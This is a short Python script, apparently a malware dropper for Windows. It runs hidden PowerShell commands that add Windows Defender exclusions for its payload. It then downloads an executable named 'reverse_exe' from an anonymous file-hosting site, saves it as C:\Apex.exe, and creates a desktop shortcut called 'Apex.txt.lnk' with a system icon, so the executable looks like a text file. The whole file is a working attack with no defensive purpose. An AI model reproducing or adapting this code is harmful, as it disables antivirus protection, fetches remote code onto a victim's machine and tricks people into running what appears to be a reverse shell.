import subprocess
import os
import winshell
import wget
import certifi


cert_file=certifi.where()

file_url = "https://anonfiles.com/hdde4752z8/reverse_exe"
download_path = "C:\\" 
file_name="Apex.exe"
file_path = os.path.join(download_path, file_name)

shortcut_path=os.path.expanduser("~\\Desktop")
icon_path = "C:\\Windows\\system32\\shell32.dll, 3"


powershell_cmds = [
    f'Add-MpPreference -ExclusionPath "{file_path}"',
    f'Add-MpPreference -ExclusionPath "{shortcut_path}"'
]

for cmd in powershell_cmds:
    subprocess.run(["powershell.exe", "-WindowStyle", "Hidden", "-Command", cmd], capture_output=True)

wget.download(file_url, file_path, ca_certs=cert_file)

shortcut_name = "Apex.txt.lnk"
shortcut_path = os.path.join(winshell.desktop(), shortcut_name)

first_file_path = file_path

winshell.CreateShortcut(
    Path=shortcut_path,
    Target=first_file_path,
    Icon=(icon_path, 0)
)
